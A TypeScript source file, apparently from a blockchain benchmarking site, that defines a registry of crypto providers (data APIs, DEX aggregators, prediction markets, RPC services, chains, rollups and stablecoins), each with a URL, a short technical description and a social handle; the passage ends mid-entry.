/**
 * Provider registry. Optional enrichment for each provider slug that
 * appears in one or more benchmark specs.
 *
 * The registry is purely additive. Providers without an entry still
 * render at /providers/<slug>, they just lack the description, URL,
 * and Twitter handle. Add a new entry when onboarding a provider.
 *
 * Keep descriptions sober and technical. One or two short sentences,
 * factual, no marketing adjectives. Twitter handle without the URL.
 */

export type ProviderRegistryEntry = {
  url: string;
  description: string;
  twitter?: string;

  // Optional rich content surfaced on the product detail page when present.
  // Every field is independently optional; the page renders only the
  // sections that have data, so partial enrichment is safe.
  longDescription?: string;
  chains?: string[];
  features?: string[];
  pricing?: string;
  founded?: number;
  docs?: string;
  github?: string;
  blog?: string;

  /** Parent product slug when this entry is a sub-product of a broader
   * brand (e.g. helius-sender → helius). The product page surfaces a
   * "Part of <parent>" badge and the parent page lists its sub-products.
   * Sub-products keep their own bench rankings — this is editorial
   * cross-linking, not data merging. */
  parent?: string;
};

export const PROVIDER_REGISTRY: Record<string, ProviderRegistryEntry> = {
  // ─── Data aggregator APIs ─────────────────────────────────────
  mobula: {
    url: "https://mobula.io",
    description:
      "Onchain data aggregator covering 80+ chains. WebSocket fast-trade feed, REST market and metadata, wallet portfolio APIs.",
    twitter: "@MobulaFi",
  },
  codex: {
    url: "https://www.codex.io",
    description:
      "Onchain market data API for EVM and Solana. GraphQL and WebSocket feeds for tokens, pairs, trades, and pricing.",
    twitter: "@CodexData",
  },
  geckoterminal: {
    url: "https://www.geckoterminal.com",
    description:
      "DEX data terminal by CoinGecko covering 200+ chains. REST API for pools, tokens, trades, and OHLCV.",
    twitter: "@GeckoTerminal",
  },
  jupiter: {
    url: "https://jup.ag",
    description:
      "Solana swap aggregator. REST APIs for quotes, swap routing, price, and token lists across Solana DEXs.",
    twitter: "@JupiterExchange",
  },
  raydium: {
    url: "https://raydium.io",
    description:
      "Solana AMM with both standard constant-product pools and concentrated liquidity (CLMM). Trade API exposes single-venue swap quotes and route construction over Raydium-owned liquidity only. Not an aggregator.",
    twitter: "@RaydiumProtocol",
  },
  openocean: {
    url: "https://openocean.finance",
    description:
      "Multi-chain DEX aggregator. v4 swap API quotes and routes across EVM chains and Solana, aggregating across multiple AMMs with gas-aware path selection.",
    twitter: "@OpenOceanGlobal",
  },
  moralis: {
    url: "https://moralis.io",
    description:
      "Multi-chain Web3 data API across EVM chains and Solana. REST endpoints for tokens, NFTs, wallets, balances, and prices.",
    twitter: "@MoralisWeb3",
  },
  helius: {
    url: "https://www.helius.dev",
    description:
      "Solana RPC and data provider. Enhanced transactions, webhooks, DAS API for assets, and standard JSON-RPC.",
    twitter: "@heliuslabs",
  },
  zerion: {
    url: "https://zerion.io/api",
    description:
      "Wallet data API behind the Zerion app. Transactions, balances, positions and portfolio across 25+ chains, sub-second indexing claims, free tier at 60k calls/month.",
    twitter: "@zerion",
  },
  allium: {
    url: "https://www.allium.so",
    description:
      "Enterprise blockchain data platform. Real-time wallet and activity APIs across 100+ chains, plus SQL analytics; serves institutional data teams.",
    twitter: "@alliumlabs",
  },
  goldrush: {
    url: "https://goldrush.dev",
    description:
      "Multi-chain wallet data API by Covalent. Transactions, balances and NFT data across 100+ chains with a unified schema; free tier at 100k credits/month.",
    twitter: "@GoldRush_dev",
  },
  dune: {
    url: "https://dune.com",
    description:
      "Onchain analytics platform. SQL-queryable indexed data across EVM chains and Solana, public dashboards, plus the Sim REST API for wallet balances, transactions, token info, holders, and DeFi positions across 60+ EVM mainnets.",
    twitter: "@DuneAnalytics",
  },
  coinpaprika: {
    url: "https://coinpaprika.com",
    description:
      "Independent crypto market data API. Token prices, OHLCV, exchange tickers, and contract/platform lookups across 300+ supported chains. Public free tier with no auth.",
    twitter: "@coinpaprika",
  },
  coinstats: {
    url: "https://coinstats.app",
    description:
      "Portfolio tracker and market data API. REST endpoints for prices, exchanges, NFTs, and wallet balances across 100+ blockchains. Consumer app + paid API tiers.",
    twitter: "@CoinStats",
  },

  // ─── NFT data APIs (bench 040) ────────────────────────────────
  alchemy: {
    url: "https://www.alchemy.com",
    description:
      "Web3 infrastructure provider offering NFT API, RPC nodes, and blockchain data APIs. Multi-chain EVM coverage.",
    twitter: "@AlchemyPlatform",
  },
  opensea: {
    url: "https://opensea.io",
    description:
      "NFT marketplace and data API. Multi-chain support for ERC721/ERC1155 collection metadata and trading data.",
    twitter: "@opensea",
  },

  // ─── EVM swap aggregators / RFQ / routers (bench 002) ─────────
  kyberswap: {
    url: "https://kyberswap.com",
    description:
      "EVM DEX aggregator by Kyber Network. Pathfinder routes across 420+ liquidity sources on 17+ EVM chains, splitting trades atomically for best net output after gas.",
    twitter: "@KyberNetwork",
  },
  bebop: {
    url: "https://bebop.xyz",
    description:
      "Gasless RFQ DEX aggregating onchain and offchain liquidity. Bebop Router and the JAM just-in-time auction model combine market-maker quotes with onchain pools across multiple EVM chains.",
    twitter: "@bebop_dex",
  },
  cow: {
    url: "https://cow.fi",
    description:
      "CoW Protocol settles trades via batch auctions with coincidence-of-wants matching, MEV protection, and solver competition. CoW Swap is the reference frontend; the protocol settles flow from many integrators.",
    twitter: "@CoWSwap",
  },
  enso: {
    url: "https://www.enso.build",
    description:
      "DeFi shared engine that maps onchain interactions into composable actions. The Route API computes optimal multi-step paths across protocols and chains, abstracting approvals, swaps, vault entries, and bridges into a single call.",
    twitter: "@EnsoBuild",
  },

  // ─── Prediction markets (bench 028) ───────────────────────────
  polymarket: {
    url: "https://polymarket.com",
    description:
      "The largest crypto prediction market, settled on Polygon via UMA optimistic oracle. CLOB-style order book hosted on the Polymarket gateway with sub-second publish latency for live odds.",
    twitter: "@Polymarket",
  },
  kalshi: {
    url: "https://kalshi.com",
    description:
      "CFTC-regulated US prediction market exchange. REST trade API (trade-api/v2) with documented per-tier rate limits; the market data WebSocket requires authentication.",
    twitter: "@Kalshi",
  },
  limitless: {
    url: "https://limitless.exchange",
    description:
      "Prediction market on Base mixing CLOB and AMM markets, from 5-minute crypto markets to long-dated events. Public REST API, rate limits undocumented.",
    twitter: "@trylimitless",
  },
  manifold: {
    url: "https://manifold.markets",
    description:
      "Play-money prediction market with AMM-based binary and multiple-choice markets. Documented public API at 500 requests per minute per IP, bots explicitly welcome.",
    twitter: "@ManifoldMarkets",
  },
  myriad: {
    url: "https://myriad.markets",
    description:
      "AMM prediction market with a keyless public REST API budgeted at 30 requests per 10 seconds. No order book endpoint and no public WebSocket.",
    twitter: "@MyriadMarkets",
  },

  // ─── Solana transaction landing services ──────────────────────
  jito: {
    url: "https://www.jito.wtf",
    description:
      "Solana MEV infrastructure. Block Engine runs an off-chain tip auction for atomic bundles, the oldest production transaction-landing service on Solana.",
    twitter: "@jito_labs",
  },
  "helius-sender": {
    url: "https://www.helius.dev/docs/sending-transactions/sender",
    description:
      "Helius transaction sender for Solana. Dual-path submission to Jito and SWQoS staked validators from 7 regional endpoints, no API credit cost.",
    twitter: "@heliuslabs",
    parent: "helius",
  },
  nozomi: {
    url: "https://www.temporal.xyz/nozomi",
    description:
      "Solana transaction landing service by Temporal Labs. Direct-to-leader submission from 9 colocated regions, tip paid only on successful landing.",
    twitter: "@temporal_xyz",
  },
  "solana-official": {
    url: "https://solana.com",
    description:
      "api.mainnet-beta.solana.com is the chain-official public RPC operated by Solana Labs, the endpoint every tutorial and SDK defaults to, documented at roughly 100 requests per 10 seconds per IP.",
    twitter: "@solana",
  },
  leorpc: {
    url: "https://leorpc.com",
    description:
      "LeoRPC is a community Solana RPC operation exposing a publicly documented FREE tier through a query key, one of the few remaining keyless ways to read Solana mainnet.",
  },
  aapl: {
    url: "https://www.apple.com",
    description:
      "Apple tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  nvda: {
    url: "https://www.nvidia.com",
    description:
      "Nvidia tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  googl: {
    url: "https://abc.xyz",
    description:
      "Alphabet tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  tsla: {
    url: "https://www.tesla.com",
    description:
      "Tesla tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  pltr: {
    url: "https://www.palantir.com",
    description:
      "Palantir tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  meta: {
    url: "https://www.meta.com",
    description:
      "Meta Platforms tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  amd: {
    url: "https://www.amd.com",
    description:
      "AMD tokenized equity issued by Robinhood on Robinhood Chain (contract 0x86923f96303D656E4aa86D9d42D1e57ad2023fdC), trading against USDG on Uniswap v4 around the clock. OpenChainBench measures its live price deviation from the real market on the tokenized stock peg benchmark.",
  },
  msft: {
    url: "https://www.microsoft.com",
    description:
      "Microsoft tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  amzn: {
    url: "https://www.amazon.com",
    description:
      "Amazon tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  spy: {
    url: "https://www.ssga.com",
    description:
      "SPDR S&P 500 ETF (State Street) tokenized equity measured across issuers on the RWA benchmarks: Robinhood's token on Robinhood Chain (Uniswap v4 vs USDG) and Backed's xStock on Solana (Jupiter executable mid vs USDC), each tracked live against the real market price.",
  },
  mu: {
    url: "https://www.micron.com",
    description:
      "Micron Technology tokenized equity issued by Robinhood on Robinhood Chain (contract 0xfF080c8ce2E5feadaCa0Da81314Ae59D232d4afD), trading against USDG on Uniswap v4 around the clock. OpenChainBench measures its live price deviation from the real market on the tokenized stock peg benchmark.",
  },
  hood: {
    url: "https://robinhood.com",
    description:
      "Robinhood Markets tokenized equity, issued by Backed as HOODx on Solana. Notably absent from Robinhood's own chain: the only onchain HOOD is third party. Tracked live against the Nasdaq price on the xStocks peg benchmark.",
  },
  qqq: {
    url: "https://www.invesco.com",
    description:
      "Invesco QQQ Nasdaq 100 ETF, tokenized by Backed as QQQx on Solana. Tracked live against the real ETF price on the xStocks peg benchmark.",
  },
  coin: {
    url: "https://www.coinbase.com",
    description:
      "Coinbase tokenized equity, issued by Backed as COINx on Solana, a crypto exchange's stock trading on a blockchain. Tracked live against the Nasdaq price on the xStocks peg benchmark.",
  },
  "orca-solana": {
    url: "https://www.orca.so",
    description:
      "Orca is Solana's concentrated liquidity DEX. Its USDY/USDC whirlpool is the deepest genuine venue for Ondo's tokenized treasury and the market leg of the USDY NAV basis benchmark.",
  },
  "pyth-market": {
    url: "https://pyth.network",
    description:
      "Pyth Network's USDY/USD market composite aggregates USDY trading into one feed. Measured against Pyth's own USDY redemption rate feed on the NAV basis benchmark.",
  },
  bloxroute: {
    url: "https://bloxroute.com",
    description:
      "bloXroute Labs runs a low-latency blockchain distribution network for traders and validators. Its free Protect RPC routes Ethereum and BSC transactions away from the public mempool, and its Solana relay competes on transaction landing.",
    twitter: "@bloXrouteLabs",
  },
  "0slot": {
    url: "https://0slot.trade",
    description:
      "Solana transaction landing service. SWQoS-based premium sender with globally distributed endpoints (Frankfurt, Amsterdam, NY, Tokyo, LA) and tip-based prioritization.",
    twitter: "@0slot_trade",
  },
  nextblock: {
    url: "https://nextblock.io",
    description:
      "Solana transaction landing service. SWQoS sender backed by a large stake pool, plus a TX Stream API for low-latency mempool-style transaction feeds.",
    twitter: "@nextblock_sol",
  },
  astralane: {
    url: "https://astralane.io",
    description:
      "Solana transaction landing service. Iris sender uses validator co-location and leader-schedule-aware routing for p90 sub-slot latency on high-frequency workloads.",
    twitter: "@Astralaneio",
  },
  solanavibestation: {
    url: "https://solanavibestation.com",
    description:
      "Solana transaction landing service. Lightspeed sender routes through SVS's own ~101K SOL validator pool with co-located bare-metal infra in Atlanta and Amsterdam.",
    twitter: "@solvibestation",
  },

  // ─── Bridges ──────────────────────────────────────────────────
  relay: {
    url: "https://relay.link",
    description:
      "Cross-chain intent network from Reservoir. Users sign an intent, relayers compete to fill on the destination, settlement is typically sub-30 seconds.",
    twitter: "@RelayProtocol",
  },
  lifi: {
    url: "https://li.fi",
    description:
      "Cross-chain bridge and DEX aggregator. Routes swaps across bridges and liquidity sources via a single API, with EVM and Solana support.",
    twitter: "@lifiprotocol",
  },
  debridge: {
    url: "https://debridge.finance",
    description:
      "Cross-chain intent protocol using the DLN solver network. Liquidity is filled by solvers on the destination chain, no wrapped assets or LP pools.",
    twitter: "@deBridgeFinance",
  },
  "near-intents": {
    url: "https://near-intents.org",
    description:
      "Cross-chain intent layer from NEAR Protocol. The 1Click API runs a solver auction bus, signed quotes are settled by the winning market maker. Quote latency reflects bid arrival, not route search across LPs.",
    twitter: "@NEARProtocol",
    longDescription:
      "Near Intents abstracts cross-chain transfers behind a single solver auction. The client submits an intent (source asset, destination asset, amount, recipient) and a 1Click coordinator polls a pool of market makers for sealed bids. The winning bid is returned as a signed quote that the client can execute by sending funds to a one-time deposit address. Asset coverage is NEP-141 wrapped on the NEAR omni-bridge for EVM and SVM chains, with HyperCore as a destination-only target.",
    docs: "https://docs.near-intents.org",
  },

  // ─── Perp DEX ─────────────────────────────────────────────────
  lighter: {
    url: "https://lighter.xyz",
    description:
      "Onchain perp DEX with a fully onchain orderbook on a zkSync rollup. ZK proofs verify matching, no off-chain sequencer for trade execution.",
    twitter: "@Lighter_xyz",
  },
  hyperliquid: {
    url: "https://hyperliquid.xyz",
    description:
      "Onchain perp DEX on the Hyperliquid L1. Fully onchain orderbook with sub-second matching, no off-chain matching engine.",
    twitter: "@HyperliquidX",
  },
  dydx: {
    url: "https://dydx.trade",
    description:
      "Perp DEX on the dYdX Chain, a Cosmos SDK appchain. Orderbook with off-chain matching and onchain settlement, validators propagate orders via the mempool.",
    twitter: "@dYdX",
  },
  gmx: {
    url: "https://gmx.io",
    description:
      "Perp DEX on Arbitrum and Avalanche. Pool-based execution against GLP and GM vaults, oracle-priced trades with no orderbook.",
    twitter: "@GMX_IO",
  },
  gains: {
    url: "https://gains.trade",
    description:
      "Perp DEX on Polygon, Arbitrum, Base and Solana. Pool-based execution against the gToken vaults, oracle-priced trades with synthetic leverage.",
    twitter: "@GainsNetwork_io",
  },

  // ─── Wallet labels / explorers ────────────────────────────────
  blockscout: {
    url: "https://www.blockscout.com",
    description:
      "Open-source multi-chain EVM block explorer. Exposes address tags and public labels through its REST and JSON-RPC APIs.",
    twitter: "@blockscoutcom",
  },
  oli: {
    url: "https://www.openlabelsinitiative.org",
    description:
      "Open Labels Initiative, a community standard and shared dataset for EVM address labels. Distributes labels via GitHub and a public API.",
    twitter: "@open_labels",
  },
  tonapi: {
    url: "https://tonapi.io",
    description:
      "REST API for the Gram (TON) blockchain. Returns account metadata, known entity names, and address book labels for Gram wallets.",
    twitter: "@tonapi_io",
  },
  stellarexpert: {
    url: "https://stellar.expert",
    description:
      "Block explorer for the Stellar network. Provides a directory API of curated account labels, anchors, and known issuers.",
    twitter: "@stellarexpert",
  },
  xrpscan: {
    url: "https://xrpscan.com",
    description:
      "Block explorer for the XRP Ledger. Offers a public REST API with account info and known wallet names via its names endpoint.",
    twitter: "@xrpscan",
  },
  walletexplorer: {
    url: "https://www.walletexplorer.com",
    description:
      "Bitcoin address clusterer and labeler. Tracks exchange deposit clusters, mixers, and known services since 2013.",
  },

  // ─── L1 chains ────────────────────────────────────────────────
  bnb: {
    url: "https://www.bnbchain.org",
    description:
      "Proof-of-Staked-Authority L1 with 21 active validators rotating per epoch. Probabilistic finality reached after roughly 2 blocks. Block time around 3 seconds.",
    twitter: "@BNBCHAIN",
  },
  avalanche: {
    url: "https://www.avax.network",
    description:
      "Primary Network runs the Snowman BFT consensus derived from Snow protocols. Sub-second deterministic finality with no chain reorganizations.",
    twitter: "@avax",
  },
  sui: {
    url: "https://sui.io",
    description:
      "Move-based L1 using Mysticeti BFT consensus over a DAG. Owned-object transactions bypass consensus via Fast Path. Deterministic finality under one second.",
    twitter: "@SuiNetwork",
  },
  gram: {
    url: "https://ton.org",
    description:
      "Gram (formerly Toncoin, ticker renamed to GRAM in June 2026). BFT Proof-of-Stake L1 with a sharded masterchain and workchain architecture. Deterministic finality within a few seconds. Block time near 5 seconds.",
    twitter: "@ton_blockchain",
  },
  stellar: {
    url: "https://stellar.org",
    description:
      "Federated Byzantine Agreement via the Stellar Consensus Protocol with quorum slices. Deterministic finality per ledger close, roughly every 5 seconds.",
    twitter: "@StellarOrg",
  },
  solana: {
    url: "https://solana.com",
    description:
      "Proof-of-History sequencing combined with Tower BFT consensus. Probabilistic finality at 32 confirmed slots. Slot time around 400 milliseconds.",
    twitter: "@solana",
  },
  tron: {
    url: "https://tron.network",
    description:
      "DPoS L1 with 27 elected Super Representatives. 3-second block times and deterministic finality after about 19 confirmations.",
    twitter: "@trondao",
  },
  ethereum: {
    url: "https://ethereum.org",
    description:
      "PoS chain using Gasper (Casper FFG plus LMD-GHOST). 12-second slots with deterministic finality every two epochs, roughly 12.8 minutes.",
    twitter: "@ethereum",
  },
  cardano: {
    url: "https://cardano.org",
    description:
      "Ouroboros Praos PoS with 20-second slots and 1 block per 20 seconds on average. Probabilistic finality after about 2,160 blocks (k parameter).",
    twitter: "@Cardano",
  },
  litecoin: {
    url: "https://litecoin.org",
    description:
      "PoW chain with 2.5-minute block times and Scrypt mining. UTXO model inherited from Bitcoin with subsidy halvings every 840,000 blocks.",
    twitter: "@litecoin",
  },
  monero: {
    url: "https://www.getmonero.org",
    description:
      "Privacy-focused PoW chain using RandomX, tuned for CPU mining. 2-minute block times with ring signatures of size 16 and stealth addresses by default.",
    twitter: "@monero",
  },

  // ─── Cosmos chains (token-deployment-cost bench) ──────────────
  osmosis: {
    url: "https://osmosis.zone",
    description:
      "Cosmos SDK appchain and the largest IBC-connected DEX. CometBFT consensus with deterministic finality per block, around 6-second block time. TokenFactory module exposes MsgCreateDenom with denom_creation_fee currently set to an empty list, so creating a new denom costs only gas.",
    twitter: "@osmosiszone",
  },
  injective: {
    url: "https://injective.com",
    description:
      "Cosmos SDK L1 with a native onchain orderbook and EVM compatibility layer. CometBFT consensus, sub-second block time, deterministic finality per block. TokenFactory MsgCreateDenom carries a flat 0.1 INJ governance fee on top of gas.",
    twitter: "@injective",
  },
  neutron: {
    url: "https://www.neutron.org",
    description:
      "CosmWasm smart-contract chain secured by Cosmos Hub via Interchain Security. CometBFT consensus with deterministic finality per block, around 2-second block time. TokenFactory denom_creation_fee is empty, so creating a new denom costs only gas.",
    twitter: "@Neutron_org",
  },

  // ─── Ethereum L2 rollups ──────────────────────────────────────
  arbitrum: {
    url: "https://arbitrum.io",
    description:
      "Optimistic rollup built on Nitro stack with a fast-finality sequencer. Sub-second block times (~250 ms) via a 250 ms default block interval, far below the 2 s OP Stack convention. 7-day fraud-proof window for L1 finality.",
    twitter: "@arbitrum",
  },
  optimism: {
    url: "https://www.optimism.io",
    description:
      "Optimistic rollup and the canonical OP Stack reference implementation. 2-second sequencer block time, 7-day fraud-proof window, anchored to Ethereum L1 via batch submissions to the Optimism Portal.",
    twitter: "@Optimism",
  },
  base: {
    url: "https://www.base.org",
    description:
      "Coinbase-operated optimistic rollup on the OP Stack. 2-second sequencer block time, shared bridge with Optimism via the OP Superchain, fastest-growing L2 by TVL since 2024.",
    twitter: "@base",
  },
  blast: {
    url: "https://blast.io",
    description:
      "OP Stack fork with native ETH and stablecoin yield baked into the L2 protocol (ETH rebases via Lido, USDB via MakerDAO). 2-second sequencer block time, otherwise stock OP Stack.",
    twitter: "@Blast_L2",
  },
  mantle: {
    url: "https://www.mantle.xyz",
    description:
      "Modular OP Stack fork using EigenDA for data availability rather than Ethereum calldata, cutting L1 anchoring cost. 2-second sequencer block time, MNT token for gas (ETH-pegged).",
    twitter: "@Mantle_Official",
  },
  linea: {
    url: "https://linea.build",
    description:
      "ConsenSys zkEVM rollup with a prover-bound block cadence. Idle periods batch into longer intervals (p50 around 3-6 s) while busy periods produce blocks closer to the nominal 2 s mark.",
    twitter: "@LineaBuild",
  },
  scroll: {
    url: "https://scroll.io",
    description:
      "Native bytecode-equivalent zkEVM rollup. Sequencer cadence is prover-bound: empty periods see longer gaps between blocks while busy minutes produce blocks at a sub-3-second rate.",
    twitter: "@Scroll_ZKP",
  },
  zksync: {
    url: "https://zksync.io",
    description:
      "Matter Labs' zk-rollup with the ZK Stack reference implementation and a custom LLVM-based VM (EraVM). Batched producer with variable block cadence (p50 ~3-6 s) tied to proof generation rather than fixed sequencer intervals.",
    twitter: "@zksync",
  },
  taiko: {
    url: "https://taiko.xyz",
    description:
      "Based rollup: Ethereum L1 validators sequence the L2 directly via Taiko Inbox contracts, no separate sequencer. Block time around 3 seconds. Fundamentally different trust model from the operator-sequenced rollups in the rest of the field.",
    twitter: "@taikoxyz",
  },

  // ─── Public RPC providers ─────────────────────────────────────
  "monad-official": {
    url: "https://docs.monad.xyz",
    description:
      "Monad Foundation's primary public RPC (rpc.monad.xyz, QuickNode-backed, 25 rps). Four additional official mirrors run on Alchemy, Goldsky, Ankr and Foundation infrastructure.",
    twitter: "@monad_xyz",
  },
  "megaeth-official": {
    url: "https://docs.megaeth.com",
    description:
      "MegaETH's official public RPC (mainnet.megaeth.com). Compute-unit and bandwidth limited; WebSocket endpoint exposes the 10 ms mini-block realtime API.",
    twitter: "@megaeth_labs",
  },
  onfinality: {
    url: "https://onfinality.io",
    description:
      "Multi-chain infrastructure provider. Public keyless endpoints on 80+ networks with generous daily limits, plus dedicated and API-key tiers.",
    twitter: "@OnFinality",
  },
  quicknode: {
    url: "https://www.quicknode.com",
    description:
      "Keyed RPC infrastructure across 30+ chains. Endpoint-scoped API tokens; free and paid plans are served from the same shared fleet, dedicated clusters on higher tiers.",
    twitter: "@QuickNode",
  },
  infura: {
    url: "https://www.infura.io",
    description:
      "RPC infrastructure by Consensys, now part of the MetaMask Developer platform. Keyed endpoints across 40+ networks; free tier meters 3M credits per day.",
    twitter: "@infura_io",
  },
  ankr: {
    url: "https://www.ankr.com/rpc/",
    description:
      "Multi-chain RPC service covering 65+ chains on the freemium tier. One API key across chains; some networks are premium-gated.",
    twitter: "@ankr",
  },
  chainstack: {
    url: "https://chainstack.com",
    description:
      "Managed blockchain node platform. Deploys dedicated Global Nodes per chain with keyed HTTPS/WSS endpoints; free plan includes one node and 3M requests per month.",
    twitter: "@ChainstackHQ",
  },
  publicnode: {
    url: "https://www.publicnode.com",
    description:
      "Public no-key RPC service operated by Allnodes covering 70+ chains. JSON-RPC and WebSocket endpoints with archive support on most networks.",
    twitter: "@AllnodesHQ",
  },
  drpc: {
    url: "https://drpc.org",
    description:
      "Decentralized RPC mesh routing requests across third-party node providers with consensus checks. Free public tier plus higher-tier authenticated access.",
    twitter: "@drpcorg",
  },
  "1rpc": {
    url: "https://1rpc.io",
    description:
      "Privacy-preserving public RPC by Automata Network. Strips client metadata before forwarding to upstream node operators; load-balanced across providers.",
    twitter: "@1RPC_io",
  },
  meowrpc: {
    url: "https://meowrpc.com",
    description:
      "Free public RPC service covering Ethereum, Base, Arbitrum, Optimism and other EVM chains. No registration required, modest rate limits per IP.",
  },
  flashbots: {
    url: "https://rpc.flashbots.net",
    description:
      "Flashbots Protect RPC sends transactions through a private mempool, shielding them from sandwich attacks. Read calls go to a standard Ethereum node behind the proxy.",
    twitter: "@flashbots",
  },
  cloudflare: {
    url: "https://cloudflare-eth.com",
    description:
      "Cloudflare's public Ethereum gateway. Recently switched to a permissioned mode for many JSON-RPC methods, returning `-32046 Cannot fulfill request` for most endpoints.",
    twitter: "@Cloudflare",
  },
  "base-official": {
    url: "https://mainnet.base.org",
    description:
      "Official Base public RPC operated by the Base team (Coinbase). No-key access for read methods; documented as best-effort with rate limits.",
    twitter: "@base",
    parent: "base",
  },
  binance: {
    url: "https://docs.bnbchain.org/docs/rpc",
    description:
      "Official BNB Chain RPC endpoints operated by Binance. Multiple dataseed hosts (`bsc-dataseed1.binance.org` etc.) round-robin for load distribution.",
    twitter: "@BNBCHAIN",
  },
  tenderly: {
    url: "https://tenderly.co",
    description:
      "Tenderly's public gateway exposes a no-key JSON-RPC endpoint per chain at `gateway.tenderly.co/public/<slug>`. Covers Ethereum, Polygon, Arbitrum, Optimism, Base, Avalanche, Linea, Scroll and Mantle. The same Tenderly platform behind the keyed Web3 dev suite.",
    twitter: "@TenderlyApp",
  },
  nodies: {
    url: "https://nodies.app",
    description:
      "Nodies is the surviving public-RPC frontend for POKT Network's decentralized infrastructure. Per-chain subdomains like `eth-pokt.nodies.app`, `polygon-pokt.nodies.app`, `arb-pokt.nodies.app`. Covers most major EVM chains no-key.",
    twitter: "@nodies_app",
  },
  lava: {
    url: "https://www.lavanet.xyz",
    description:
      "Lava Network is a decentralized RPC mesh with permissionless validators. Public no-key endpoints work for Ethereum (`eth1.lava.build`) and Arbitrum (`arb1.lava.build`); other chains require an account-issued key.",
    twitter: "@lavanetxyz",
  },
  merkle: {
    url: "https://merkle.io",
    description:
      "Merkle exposes per-chain RPC subdomains (`eth.merkle.io`, `base.merkle.io`, `bsc.merkle.io`). Stable on Base + BSC for no-key benchmarking; Ethereum is fronted by an aggressive Cloudflare bot filter (20-minute lockout after a single request) so we exclude it from the leaderboard.",
    twitter: "@merkle_xyz",
  },
  "arbitrum-official": {
    url: "https://docs.arbitrum.io/build-decentralized-apps/reference/node-providers",
    description:
      "Arbitrum Foundation's public RPC endpoint at `arb1.arbitrum.io/rpc`. Best-effort, rate-limited, intended for dev access. Production dapps are expected to use a keyed provider.",
    twitter: "@arbitrum",
    parent: "arbitrum",
  },
  "optimism-official": {
    url: "https://docs.optimism.io/builders/tools/build/node-providers",
    description:
      "Optimism Foundation's public RPC endpoint at `mainnet.optimism.io`. Best-effort, rate-limited, intended as a fallback. The Foundation recommends keyed providers for production load.",
    twitter: "@Optimism",
    parent: "optimism",
  },
  "avalanche-official": {
    url: "https://docs.avax.network/dapps/rpc-providers",
    description:
      "Ava Labs' public C-Chain RPC at `api.avax.network/ext/bc/C/rpc`. Best-effort, capped per IP. Production dapps usually graduate to keyed providers (Ankr, BlockDaemon, GetBlock).",
    twitter: "@avax",
    parent: "avalanche",
  },

  // ─── Gas oracles ──────────────────────────────────────────────
  "publicnode-feehistory": {
    url: "https://www.publicnode.com",
    description:
      "Gas predictor that wraps the canonical eth_feeHistory JSON-RPC method against PublicNode's Ethereum endpoint. Returns reward percentiles directly from the EIP-1559 spec implementation; no proprietary model.",
    twitter: "@AllnodesHQ",
    parent: "publicnode",
  },
  owlracle: {
    url: "https://owlracle.info",
    description:
      "Multi-oracle gas aggregator across Ethereum, BNB Chain, Polygon and other EVM chains. Free tier 100 requests/hour, 1000/h with a free API key. Recommendation aggregates several upstream oracles into a single tier value.",
    twitter: "@owlracle",
  },
  etherscan: {
    url: "https://etherscan.io/gastracker",
    description:
      "Most-visited Ethereum gas tracker on the web, operated by Etherscan. The v2 gastracker API exposes Safe / Propose / Fast tiers; the legacy single-price shape predates EIP-1559's per-tier priority-fee model.",
    twitter: "@etherscan",
  },

  // ─── Stablecoin issuers (appearing as providers in peg bench) ─
  usdc: {
    url: "https://www.circle.com/usdc",
    description:
      "Circle's USD-redeemed stablecoin, audited and backed by short-duration Treasuries and same-day USD cash. Same-day primary-market redemption with US banks is the structural anchor for the peg.",
    twitter: "@circle",
  },
  usdt: {
    url: "https://tether.to",
    description:
      "Tether's USD-pegged stablecoin, the dominant pair currency on most non-US crypto venues. Primary-market redemption is slower than USDC; secondary-market peg carries a premium during risk-on minutes.",
    twitter: "@Tether_to",
  },
  dai: {
    url: "https://makerdao.com",
    description:
      "MakerDAO's overcollateralized stablecoin (now Sky's USDS legacy version). CEX coverage is essentially dead in 2026; the only honest live peg signal is on-chain via Curve 3pool's get_dy.",
    twitter: "@MakerDAO",
  },
  fdusd: {
    url: "https://firstdigitallabs.com",
    description:
      "First Digital USD, Hong Kong-issued stablecoin backed 1:1 by USD reserves. Primary depth lives on Binance USDT-quoted FDUSDUSDT; USD-quoted venues offer negligible volume.",
    twitter: "@firstdigitallabs",
  },
  usde: {
    url: "https://ethena.fi",
    description:
      "Ethena's synthetic dollar anchored by a delta-neutral basis trade on perpetual futures. Flashed to $0.65 on Binance USDEUSDT during the October 10 2025 liquidation cascade.",
    twitter: "@ethena_labs",
  },

  // ─── Buyback audit (bench 018) ─────────────────────────────────
  sky: {
    url: "https://sky.money",
    description:
      "Rebrand of MakerDAO around USDS and SKY. Smart Burn Engine routes protocol surplus to buy and burn SKY against USDS on Uniswap v2.",
    twitter: "@SkyEcosystem",
  },

  // ─── Oracle deviation pairs (bench 025) ───────────────────────
  // Each "provider" in oracle-deviation is a USD trading pair. The entry
  // describes the underlying asset that the cross-oracle deviation
  // benchmark is measured against. Logos alias to the chain/asset image
  // in `lib/logo-manifest.ts`.
  "btc-usd": {
    url: "https://bitcoin.org",
    description:
      "Bitcoin, the first proof-of-work cryptocurrency. Treated as digital gold and the primary store-of-value asset across crypto markets.",
